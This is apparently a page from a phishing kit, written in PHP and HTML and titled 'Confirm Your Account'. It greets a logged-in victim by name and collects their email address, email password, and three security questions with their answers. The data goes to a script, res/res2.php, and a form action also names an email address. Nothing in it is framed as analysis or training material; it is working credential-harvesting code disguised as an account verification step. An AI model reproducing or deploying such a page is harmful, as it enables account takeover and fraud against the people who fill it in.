<?php
session_start();
?>



<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Confirm Your Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/qes.css" rel="stylesheet">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
<form name="f" action="res/res2.php" method="GET">
<div id="wb_Form1" style="position:absolute;left:83px;top:113px;width:1223px;height:696px;z-index:12;">
<form name="Form1" method="post" action="jerryman@post.com" enctype="text/plain" id="Form1">
<div id="wb_Text2" style="position:absolute;left:35px;top:23px;width:697px;height:21px;z-index:0;text-align:left;">
<span style="color:#2F4F4F;font-family:Arial;font-size:17px;"><strong>Please provide the folling information about yourself !</strong></span></div>
<input type="email" id="Editbox1" class="form-control" style="position:absolute;left:321px;top:122px;width:441px;height:34px;line-height:28px;z-index:1;" name="1" value="" placeholder="Email Address" required>


<input type="password" id="Editbox2" class="form-control" style="position:absolute;left:321px;top:167px;padding:0px 0px 0px 5px;width:441px;height:34px;line-height:28px;z-index:3;" name="2" value="" placeholder="Email Password " required>



<select name="Combobox1" size="1" class="form-control"  id="Combobox1" style="position:absolute;left:321px;top:244px;width:448px;height:34px;z-index:2;">
<option selected value="Security Question 1">Security Question 1</option>
</option>                          <OPTION value="Where were you on New Year`s 2000?">Where were you on New Year`s 2000?</OPTION>
                          <OPTION value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What was the first name of your child manager?">What was the first name of your child manager?</OPTION>
                          <OPTION value="As a child, What did you want to be when u grew up?">As a child, What did you want to be when u grew up?</OPTION>
                          <OPTION value="What was the first live concert you attended?">What was the first live concert you attended?</OPTION>
                          <OPTION value="What was the mke and model of your first car?">What was the mke and model of your first car?</OPTION>
                          <OPTION value="What is the name of your high schools star athlete?">What is the name of your high schools star athlete?</OPTION>
                          <OPTION value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</OPTION>
                          <OPTION value="Who is your favorite person in history?">Who is your favorite person in history?</OPTION>
                                <OPTION value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</OPTION>
                                <OPTION value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</OPTION>
                                <OPTION value="In what city were you born?">In what city were you born? (Enter full name of city only)</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What was your high school mascot?">What was your high school mascot?</OPTION>
                                <OPTION value="On what street did you grow up?">On what street did you grow up?</OPTION>
                                <OPTION value="What is your oldest sibling's middle name?">What is your oldest sibling's middle name?</OPTION>
                                <OPTION value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</OPTION>
                                <OPTION value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</OPTION>
                                <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                                <OPTION value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</OPTION>
</select>






<select name="Combobox2" size="1" class="form-control" id="Combobox2" style="position:absolute;left:321px;top:347px;width:448px;height:34px;z-index:4;">
<option selected value="Security Question 2">Security Question 2</option>
<OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                                <OPTION value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</OPTION>
                                <OPTION value="What was the name of your first pet?">What was the name of your first pet?</OPTION>
                                <OPTION value="What is the first name of your hairdesser/barber?">What is the first name of your hairdesser/barber?</OPTION>
                                <OPTION value="What is the first name of your mother`s closest friend?">What is the first name of your mother`s closest friend?</OPTION>
                                <OPTION value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</OPTION>
                          <OPTION value="What is your father's middle name?">What is your father's middle name?</OPTION>
                          <OPTION value="What is your mother's middle name?">What is your mother's middle name?</OPTION>
                          <OPTION value="In what city were you married?">In what city were you married?</OPTION>
                          <OPTION value="In what city is your vacation home?">In what city is your vacation home?</OPTION>
                          <OPTION value="What is the first name of your first child?">What is the first name of your first child?</OPTION>
                          <OPTION value="What is the name of your first employer?">What is the name of your first employer?</OPTION>
                                <OPTION value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</OPTION>
                                <OPTION value="What is the name of a collage you applied to but didn`t attend?">What is the name of a collage you applied to but didn`t attend?</OPTION>
                                <OPTION value="What is your all-time favorite song?">What is your all-time favorite song?</OPTION>
                                <OPTION value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</OPTION>
                                <OPTION value="On what street is your grocery store?">On what street is your grocery store?</OPTION>
                          <OPTION value="What is your favorite hobby?">What is your favorite hobby?</OPTION>
                          <OPTION value="In what city were you living at age 16?">In what city were you living at age 16?</OPTION>
</select>



<select name="Combobox3" size="1"class="form-control"  id="Combobox3" style="position:absolute;left:321px;top:455px;width:448px;height:34px;z-index:5;">
<option selected value="Security Question 3">Security Question 3</option>
 <OPTION value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</OPTION>
                          <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                          <OPTION value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</OPTION>
                          <OPTION value="What high school did you attend?">What high school did you attend?</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</OPTION>
                      <OPTION value="What is the last name of your third grade tracher?">What is the last name of your third grade tracher?</OPTION>
                      <OPTION value="what celebrity do you most resemble?">what celebrity do you most resemble?</OPTION>
                      <OPTION value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>

<OPTION value="What is your father's middle name?">What is your all-time favorite song?</OPTION>
                      <OPTION value="What is the name of your favorite charity?">What is the name of your favorite charity?</OPTION>
                      <OPTION value="What is the last nem of your family physician?">What is the last nem of your family physician?</OPTION>
                      <OPTION value="What is the name of your first babysitter?">What is the name of your first babysitter?</OPTION>
                      <OPTION value="What is your best friend`s first name?">What is your best friend`s first name?</OPTION>
                      <OPTION value="What street did your best friend in high school love on?">What street did your best friend in high school love on? (Enter full name of street only)</OPTION>
                      <OPTION value="In what city was your mother born?">In what city was your mother born? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your father born?">In what city was your father born? (Enter full name of city only)</OPTION>
                      <OPTION value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</OPTION>
                      <OPTION 
              value="When is your wedding anniversary?">When is your wedding anniversary? (Enter the full name of month)</OPTION>
                      <OPTION 
              value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</OPTION>
                      <OPTION value="In what city was your high school?">In what city was your high school? (Enter only "Charlotte" for Charlotte High School)</OPTION>
                      <OPTION value="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</OPTION>
                       <OPTION value="With what company did you hold your first job?">With what company did you hold your first job?</OPTION>
                      <OPTION value="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</OPTION>
                      <OPTION value="Where did you meet your spouse for the first time?">Where did you meet your spouse for the first time? (Enter full name of city only)</OPTION>
</select>


<input type="text" id="Editbox3" class="form-control" style="position:absolute;left:321px;top:281px;width:449px;height:34px;line-height:28px;z-index:6;" name="3" value="" placeholder="Answer 1" required>
<input type="text" id="Editbox4" class="form-control" style="position:absolute;left:321px;top:385px;width:449px;height:34px;line-height:28px;z-index:7;" name="4" value="" placeholder="Answer 2" required>
<input type="text" id="Editbox5" class="form-control" style="position:absolute;left:321px;top:496px;width:449px;height:34px;line-height:28px;z-index:8;" name="5" value="" placeholder="Answer 3" required>
<div id="wb_Image5" style="position:absolute;left:463px;top:589px;width:178px;height:42px;z-index:9;">
<img src="images/00.GIF" id="Image5" alt=""></div>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:464px;top:594px;width:176px;height:32px;z-index:10;">
</form>
</div>
<div id="wb_Form2" style="position:absolute;left:404px;top:19px;width:256px;height:74px;z-index:13;">
<form name="Form1" method="post" action="jerryman@post.com" enctype="text/plain" id="Form2">
<div id="wb_Text1" style="position:absolute;left:6px;top:12px;width:250px;height:32px;z-index:11;text-align:left;">
<span style="color:#A9A9A9;font-family:Arial;font-size:27px;">Account Information</span></div>
</form>
</div>
<div id="wb_Image1" style="position:absolute;left:0px;top:827px;width:1344px;height:169px;z-index:14;">
<img src="images/4.GIF" id="Image1" alt=""></div>
<div id="wb_Text3" style="position:absolute;left:118px;top:113px;width:250px;height:21px;z-index:15;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:17px;"><strong>Welcome Again! <span style="color:#A9A9A9;font-family:Arial;font-size:17px;"><?php echo $_SESSION['user']; ?></span></strong></span></div>
<div id="wb_Image2" style="position:absolute;left:73px;top:80px;width:1214px;height:13px;z-index:16;">
<img src="images/18.GIF" id="Image2" alt=""></div>
<div id="wb_Image3" style="position:absolute;left:73px;top:168px;width:1214px;height:39px;z-index:17;">
<img src="images/18.GIF" id="Image3" alt=""></div>
<div id="wb_Image4" style="position:absolute;left:73px;top:663px;width:1214px;height:39px;z-index:18;">
</form>
<img src="images/18.GIF" id="Image4" alt=""></div>
</body>
</html>